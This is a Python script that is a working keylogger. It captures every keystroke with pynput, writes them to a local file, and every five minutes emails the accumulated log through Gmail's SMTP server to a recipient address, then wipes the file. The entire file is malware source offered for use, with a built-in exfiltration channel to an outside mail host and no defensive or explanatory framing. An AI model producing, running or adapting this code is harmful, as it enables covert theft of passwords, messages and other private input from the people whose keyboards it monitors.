import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard
import os
import threading
import time

# Configuration
log_file = "keylog.txt"
email_interval = 300  # Send email every 5 minutes
email_address = "your_email@example.com"
email_password = "your_password"
recipient_email = "recipient_email@example.com"

# Function to log keystrokes
def log_key(key):
    with open(log_file, "a") as log:
        try:
            log.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            elif key == keyboard.Key.tab:
                log.write("\t")
            else:
                log.write(f" [{key}] ")

def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to send logs via email
def send_email():
    while True:
        time.sleep(email_interval)
        if os.path.exists(log_file):
            with open(log_file, "r") as file:
                log_data = file.read()

            if log_data:
                msg = MIMEMultipart()
                msg['From'] = email_address
                msg['To'] = recipient_email
                msg['Subject'] = 'Keylogger Log'

                body = MIMEText(log_data, 'plain')
                msg.attach(body)

                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(email_address, email_password)
                    server.sendmail(email_address, recipient_email, msg.as_string())
                
                # Clear the log file after sending
                open(log_file, 'w').close()

# Start keylogger and email sending in separate threads
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_keylogger)
email_thread = threading.Thread(target=send_email)

keylogger_thread.start()
email_thread.start()
